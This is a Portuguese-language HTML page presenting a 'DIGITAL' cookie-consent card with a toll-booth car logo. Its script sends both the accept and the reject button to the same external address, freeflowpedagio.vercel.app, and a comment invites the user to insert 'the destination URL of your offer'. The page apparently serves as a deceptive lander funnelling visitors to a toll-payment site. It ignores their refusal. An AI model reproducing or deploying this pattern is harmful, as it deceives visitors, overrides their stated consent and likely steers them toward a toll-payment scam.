<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Digital</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }

    body {
      min-height: 100vh;
      background: #f2f2f2;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }

    .cookie-card {
      background: #ffffff;
      border-radius: 16px;
      padding: 36px 32px;
      max-width: 440px;
      width: 100%;
      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.06);
      text-align: center;
    }

    .logo {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 12px;
      margin-bottom: 24px;
    }

    .logo-icon {
      width: 64px;
      height: 64px;
      flex-shrink: 0;
    }

    .logo-text {
      text-align: left;
      line-height: 1.1;
    }

    .logo-text .line1 {
      font-size: 18px;
      font-weight: 400;
      color: #2d2d2d;
      font-style: italic;
      display: block;
    }

    .logo-text .line2 {
      font-size: 24px;
      font-weight: 800;
      color: #1a1a1a;
      letter-spacing: 0.5px;
      display: block;
    }

    .title {
      font-size: 22px;
      font-weight: 700;
      color: #1a1a1a;
      margin-bottom: 12px;
    }

    .description {
      font-size: 14px;
      color: #555;
      line-height: 1.5;
      margin-bottom: 24px;
    }

    .buttons {
      display: flex;
      gap: 12px;
      justify-content: center;
    }

    .btn {
      flex: 1;
      padding: 12px 20px;
      border: none;
      border-radius: 8px;
      font-size: 14px;
      font-weight: 700;
      color: #ffffff;
      cursor: pointer;
      text-decoration: none;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      transition: transform 0.15s ease, box-shadow 0.15s ease, filter 0.15s ease;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
    }

    .btn:hover {
      transform: translateY(-1px);
      filter: brightness(1.05);
    }

    .btn-accept {
      background: linear-gradient(180deg, #2ecc71, #27ae60);
    }

    .btn-reject {
      background: linear-gradient(180deg, #e74c3c, #c0392b);
    }

    @media (max-width: 480px) {
      .cookie-card {
        padding: 28px 20px;
      }
      .title { font-size: 20px; }
      .buttons { flex-direction: column; }
    }
  </style>
</head>
<body>
  <div class="cookie-card">
    <div class="logo">
      <!-- Ícone: carro passando por cancela de pedágio -->
      <svg class="logo-icon" viewBox="0 0 72 72" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
        <!-- base/solo -->
        <rect x="2" y="56" width="68" height="4" rx="1" fill="#cbd5e1"/>
        <!-- poste da cancela -->
        <rect x="6" y="20" width="6" height="38" rx="1" fill="#ef4444"/>
        <rect x="4" y="18" width="10" height="4" rx="1" fill="#b91c1c"/>
        <!-- braço da cancela (listrado) -->
        <g transform="rotate(-20 9 22)">
          <rect x="9" y="20" width="50" height="6" rx="1" fill="#ffffff" stroke="#1f2937" stroke-width="1"/>
          <rect x="14" y="20" width="6" height="6" fill="#ef4444"/>
          <rect x="26" y="20" width="6" height="6" fill="#ef4444"/>
          <rect x="38" y="20" width="6" height="6" fill="#ef4444"/>
          <rect x="50" y="20" width="6" height="6" fill="#ef4444"/>
        </g>
        <!-- carro -->
        <path d="M20 52 L26 42 Q28 40 30 40 L52 40 Q54 40 56 42 L62 52 Z" fill="#1e40af"/>
        <path d="M28 42 L30 48 L52 48 L54 42 Z" fill="#93c5fd"/>
        <rect x="20" y="50" width="42" height="6" rx="2" fill="#1e3a8a"/>
        <!-- rodas -->
        <circle cx="28" cy="56" r="5" fill="#111827"/>
        <circle cx="28" cy="56" r="2" fill="#6b7280"/>
        <circle cx="54" cy="56" r="5" fill="#111827"/>
        <circle cx="54" cy="56" r="2" fill="#6b7280"/>
        <!-- farol -->
        <circle cx="60" cy="48" r="1.5" fill="#fde047"/>
      </svg>
      <div class="logo-text">
        <span class="line1"></span>
        <span class="line2">DIGITAL</span>
      </div>
    </div>

    <h1 class="title">Configuração de Cookies</h1>
    <p class="description">
      Este site utiliza cookies para oferecer a melhor experiência.<br>
      Escolha sua configuração preferida.
    </p>

    <div class="buttons">
      <a href="#" class="btn btn-accept" id="btnAccept">Aceitar Cookies</a>
      <a href="#" class="btn btn-reject" id="btnReject">Recusar Cookies</a>
    </div>
  </div>

  <script>
    // Troque a URL abaixo pela URL de destino da sua oferta
    const URL_DESTINO = "https://freeflowpedagio.vercel.app/";

    document.getElementById('btnAccept').setAttribute('href', URL_DESTINO);
    document.getElementById('btnReject').setAttribute('href', URL_DESTINO);
  </script>
</body>
</html>
